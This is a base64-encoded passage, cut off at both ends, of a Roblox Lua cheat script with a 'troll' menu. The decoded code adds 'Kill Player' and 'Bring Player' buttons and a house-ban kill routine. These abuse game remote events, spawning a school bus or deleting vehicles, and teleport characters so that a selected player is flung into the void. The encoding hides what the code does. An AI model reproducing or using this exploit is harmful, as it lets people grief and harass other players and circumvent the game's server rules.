uZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gaHVtYW5vaWQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSBodW1hbm9pZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIHZhbHVlIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb24gPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdENvbm5lY3QoVXBkYXRlQ2FtZXJhKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGlmIGdldGdlbnYoKS5DYW1lcmFDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgIGdldGdlbnYoKS5DYW1lcmFDb25uZWN0aW9uID0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIFVwZGF0ZUNhbWVyYSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKCiAgICBsb2NhbCBNZXRob2RTZWN0aW9uID0gVHJvbGxBZGRTZWN0aW9uKHsgTmFtZSA9IE1ldGhvZHMgfSkKCiAgICBUcm9sbEFkZERyb3Bkb3duKHsKICAgICAgICBOYW1lID0gU2VsZWN0IEtpbGwgTWV0aG9kLAogICAgICAgIE9wdGlvbnMgPSB7QnVzLCBDb3VjaCwgQ291Y2ggd2l0aG91dCBnb2luZyB0byB0YXJnZXQgW0JFVEFdfSwKICAgICAgICBEZWZhdWx0ID0gLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIG1ldGhvZEtpbGwgPSB2YWx1ZQogICAgICAgICAgICBwcmludChNZXRob2Qgc2VsZWN0ZWQgIC4uIHRvc3RyaW5nKHZhbHVlKSkKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGxBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSBLaWxsIFBsYXllciwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSBvciBub3QgUGxheWVyc0ZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkgdGhlbgogICAgICAgICAgICAgICAgcHJpbnQoRXJyb3IgUGxheWVyIG5vdCBzZWxlY3RlZCBvciBkb2VzIG5vdCBleGlzdCkKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgbWV0aG9kS2lsbCA9PSBDb3VjaCB0aGVuCiAgICAgICAgICAgICAgICBLaWxsUGxheWVyQ291Y2goKQogICAgICAgICAgICBlbHNlaWYgbWV0aG9kS2lsbCA9PSBDb3VjaCB3aXRob3V0IGdvaW5nIHRvIHRhcmdldCBbQkVUQV0gdGhlbgogICAgICAgICAgICAgICAgS2lsbFdpdGhDb3VjaCgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIC0tIEJ1cyBtZXRob2QKICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICAgICAgICAgIGlmIG5vdCBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICB3YXJuKEVycm9yIExvY2FsIHBsYXllcidzIEh1bWFub2lkUm9vdFBhcnQgbm90IGZvdW5kKQogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgb3JpZ2luYWxQb3NpdGlvbiA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCgogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gR2V0QnVzKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2ZWhpY2xlcyA9IGdhbWUuV29ya3NwYWNlRmluZEZpcnN0Q2hpbGQoVmVoaWNsZXMpCiAgICAgICAgICAgICAgICAgICAgaWYgdmVoaWNsZXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdmVoaWNsZXNGaW5kRmlyc3RDaGlsZChMb2NhbFBsYXllci5OYW1lIC4uIENhcikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBidXMgPSBHZXRCdXMoKQoKICAgICAgICAgICAgICAgIGlmIG5vdCBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxMTE4LjgxLCA3NS45OTgsIC0xMTM4LjYxKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmVtb3RlRXZlbnQgPSBSZXBsaWNhdGVkU3RvcmFnZUZpbmRGaXJzdENoaWxkKFJFKQogICAgICAgICAgICAgICAgICAgIGlmIHJlbW90ZUV2ZW50IGFuZCByZW1vdGVFdmVudEZpbmRGaXJzdENoaWxkKDFDYTFyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJlbW90ZUV2ZW50WzFDYTFyXUZpcmVTZXJ2ZXIoUGlja2luZ0NhciwgU2Nob29sQnVzKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgIGJ1cyA9IEdldEJ1cygpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNlYXQgPSBidXNGaW5kRmlyc3RDaGlsZChCb2R5KSBhbmQgYnVzLkJvZHlGaW5kRmlyc3RDaGlsZChWZWhpY2xlU2VhdCkKICAgICAgICAgICAgICAgICAgICBpZiBzZWF0IGFuZCBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpIGFuZCBub3QgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBzZWF0LkNGcmFtZSAgQ0ZyYW1lLm5ldygwLCAyLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCBvciBub3QgYnVzLlBhcmVudAogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIuSHVtYW5vaWQuU2l0IG9yIG5vdCBidXMuUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBrLCB2IGluIHBhaXJzKGJ1cy5Cb2R5R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2SXNBKFNlYXQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdi5DYW5Ub3VjaCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBUcmFja1BsYXllcigpCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxlY3RlZFBsYXllck5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGxheWVyID0gUGxheWVyc0ZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIdW1hbm9pZCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0SHVtYW5vaWQgYW5kIHRhcmdldEh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoYXJhY3Rlci5IdW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidXNTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KFZlY3RvcjMubmV3KDk5OTksIC00NTAsIDk5OTkpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KFBsYXllciBzYXQgZG93biwgdGFraW5nIGJ1cyB0byB0aGUgdm9pZCEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIHNpbXVsYXRlSnVtcCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlckZpbmRGaXJzdENoaWxkV2hpY2hJc0EoSHVtYW5vaWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZENoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuSnVtcGluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpbXVsYXRlSnVtcCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChTaW11bGF0aW5nIGp1bXAhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb3JpZ2luYWxQb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoUGxheWVyIHJldHVybmVkIHRvIGluaXRpYWwgcG9zaXRpb24uKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGltZSA9IHRpY2soKSAgMzUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbGF0ZXJhbE9mZnNldCA9IG1hdGguc2luKHRpbWUpICA0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZyb250QmFja09mZnNldCA9IG1hdGguY29zKHRpbWUpICAyMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidXNTZXRQcmltYXJ5UGFydENGcmFtZSh0YXJnZXRSb290LkNGcmFtZSAgQ0ZyYW1lLm5ldyhsYXRlcmFsT2Zmc2V0LCAwLCBmcm9udEJhY2tPZmZzZXQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWRXYWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHNwYXduKFRyYWNrUGxheWVyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGxBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSBCcmluZyBQbGF5ZXIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgb3Igbm90IFBsYXllcnNGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgICAgIHByaW50KEVycm9yIFBsYXllciBub3Qgc2VsZWN0ZWQgb3IgZG9lcyBub3QgZXhpc3QpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIG1ldGhvZEtpbGwgPT0gQ291Y2ggdGhlbgogICAgICAgICAgICAgICAgQnJpbmdQbGF5ZXJMTEwoKQogICAgICAgICAgICBlbHNlaWYgbWV0aG9kS2lsbCA9PSBDb3VjaCB3aXRob3V0IGdvaW5nIHRvIHRhcmdldCBbQkVUQV0gdGhlbgogICAgICAgICAgICAgICAgQnJpbmdXaXRoQ291Y2goKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAtLSBCdXMgbWV0aG9kCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgICAgICBpZiBub3QgaHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgd2FybihFcnJvciBMb2NhbCBwbGF5ZXIncyBIdW1hbm9pZFJvb3RQYXJ0IG5vdCBmb3VuZCkKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIG9yaWdpbmFsUG9zaXRpb24gPSBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQoKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIEdldEJ1cygpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmVoaWNsZXMgPSBnYW1lLldvcmtzcGFjZUZpbmRGaXJzdENoaWxkKFZlaGljbGVzKQogICAgICAgICAgICAgICAgICAgIGlmIHZlaGljbGVzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHZlaGljbGVzRmluZEZpcnN0Q2hpbGQoTG9jYWxQbGF5ZXIuTmFtZSAuLiBDYXIpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgYnVzID0gR2V0QnVzKCkKCiAgICAgICAgICAgICAgICBpZiBub3QgYnVzIHRoZW4KICAgICAgICAgICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTExOC44MSwgNzUuOTk4LCAtMTEzOC42MSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHJlbW90ZUV2ZW50ID0gUmVwbGljYXRlZFN0b3JhZ2VGaW5kRmlyc3RDaGlsZChSRSkKICAgICAgICAgICAgICAgICAgICBpZiByZW1vdGVFdmVudCBhbmQgcmVtb3RlRXZlbnRGaW5kRmlyc3RDaGlsZCgxQ2ExcikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZW1vdGVFdmVudFsxQ2Excl1GaXJlU2VydmVyKFBpY2tpbmdDYXIsIFNjaG9vbEJ1cykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICBidXMgPSBHZXRCdXMoKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgYnVzIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZWF0ID0gYnVzRmluZEZpcnN0Q2hpbGQoQm9keSkgYW5kIGJ1cy5Cb2R5RmluZEZpcnN0Q2hpbGQoVmVoaWNsZVNlYXQpCiAgICAgICAgICAgICAgICAgICAgaWYgc2VhdCBhbmQgY2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKSBhbmQgbm90IGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gc2VhdC5DRnJhbWUgIENGcmFtZS5uZXcoMCwgMiwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgb3Igbm90IGJ1cy5QYXJlbnQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIFRyYWNrUGxheWVyKCkKICAgICAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQbGF5ZXIgPSBQbGF5ZXJzRmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0UGxheWVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldEh1bWFub2lkID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXRIdW1hbm9pZCBhbmQgdGFyZ2V0SHVtYW5vaWQuU2l0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyLkh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1c1NldFByaW1hcnlQYXJ0Q0ZyYW1lKG9yaWdpbmFsUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC43KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsgWzFdID0gRGVsZXRlQWxsVmVoaWNsZXMgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuUkVGaW5kRmlyc3RDaGlsZCgxQ2ExcilGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRSb290ID0gdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRpbWUgPSB0aWNrKCkgIDM1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGxhdGVyYWxPZmZzZXQgPSBtYXRoLnNpbih0aW1lKSAgNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmcm9udEJhY2tPZmZzZXQgPSBtYXRoLmNvcyh0aW1lKSAgMjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVzU2V0UHJpbWFyeVBhcnRDRnJhbWUodGFyZ2V0Um9vdC5DRnJhbWUgIENGcmFtZS5uZXcobGF0ZXJhbE9mZnNldCwgMCwgZnJvbnRCYWNrT2Zmc2V0KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkV2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBzcGF3bihUcmFja1BsYXllcikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQoKCmxvY2FsIGZ1bmN0aW9uIGhvdXNlQmFuS2lsbCgpCiAgICBpZiBub3Qgc2VsZWN0ZWRQbGF5ZXJOYW1lIHRoZW4KICAgICAgICBwcmludChObyBwbGF5ZXIgc2VsZWN0ZWQhKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgUGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBCYWNrcGFjayA9IFBsYXllci5CYWNrcGFjawogICAgbG9jYWwgQ2hhcmFjdGVyID0gUGxheWVyLkNoYXJhY3RlcgogICAgbG9jYWwgSHVtYW5vaWQgPSBDaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCiAgICBsb2NhbCBSb290UGFydCA9IENoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICBsb2NhbCBIb3VzZXMgPSBnYW1lLldvcmtzcGFjZUZpbmRGaXJzdENoaWxkKDAwMV9Mb3RzKQogICAgbG9jYWwgT2xkUG9zID0gUm9vdFBhcnQuQ0ZyYW1lCiAgICBsb2NhbCBBbmdsZXMgPSAwCiAgICBsb2NhbCBWZWhpY2xlcyA9IFdvcmtzcGFjZS5WZWhpY2xlcwogICAgbG9jYWwgUG9zCgogICAgZnVuY3Rpb24gQ2hlY2soKQogICAgICAgIGlmIFBsYXllciBhbmQgQ2hhcmFjdGVyIGFuZCBIdW1hbm9pZCBhbmQgUm9vdFBhcnQgYW5kIFZlaGljbGVzIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbHNlCiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgc2VsZWN0ZWRQbGF5ZXIgPSBnYW1lLlBsYXllcnNGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICBpZiBzZWxlY3RlZFBsYXllciBhbmQgc2VsZWN0ZWRQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICBpZiBDaGVjaygpIHRoZW4KICAgICAgICAgICAgbG9jYWwgSG91c2UgPSBIb3VzZXNGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZSAuLiBIb3VzZSkKICAgICAgICAgICAgaWYgbm90IEhvdXNlIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGVtcHR5SG91c2UKICAgICAgICAgICAgICAgIGxvY2FsIGF2YWlsYWJsZUhvdXNlcyA9IHt9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIENvbGxlY3QgYWxsIGF2YWlsYWJsZSBob3VzZXMgKEZvciBTYWxlKQogICAgICAgICAgICAgICAgZm9yIF8sIExvdCBpbiBwYWlycyhIb3VzZXNHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIExvdC5OYW1lID09IEZvciBTYWxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG51bSBpbiBwYWlycyhMb3RHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbnVtSXNBKE51bWJlclZhbHVlKSBhbmQgbnVtLk5hbWUgPT0gTnVtYmVyIGFuZCBudW0uVmFsdWUgIDI1IGFuZCBudW0uVmFsdWUgIDEwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoYXZhaWxhYmxlSG91c2VzLCB7TG90ID0gTG90LCBOdW1iZXIgPSBudW0uVmFsdWV9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAtLSBDaG9vc2UgYSByYW5kb20gaG91c2UgZnJvbSB0aGUgbGlzdAogICAgICAgICAgICAgICAgaWYgI2F2YWlsYWJsZUhvdXNlcyAgMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmFuZG9tSG91c2UgPSBhdmFpbGFibGVIb3VzZXNbbWF0aC5yYW5kb20oMSwgI2F2YWlsYWJsZUhvdXNlcyldCiAgICAgICAgICAgICAgICAgICAgZW1wdHlIb3VzZSA9IHJhbmRvbUhvdXNlLkxvdAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhvdXNlTnVtYmVyID0gcmFuZG9tSG91c2UuTnVtYmVyCgogICAgICAgICAgICAgICAgICAgIC0tIFRlbGVwb3J0IHRvIHRoZSBCdXlEZXRlY3RvciBhbmQgY2xpY2sKICAgICAgICAgICAgICAgICAgICBsb2NhbCBCdXlEZXRlY3RvciA9IGVtcHR5SG91c2VGaW5kRmlyc3RDaGlsZChCdXlIb3VzZSkKICAgICAgICAgICAgICAgICAgICBQb3MgPSBCdXlEZXRlY3Rvci5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgIGlmIEJ1eURldGVjdG9yIGFuZCBCdXlEZXRlY3RvcklzQShCYXNlUGFydCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBCdXlEZXRlY3Rvci5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLCAtNiwgMCkK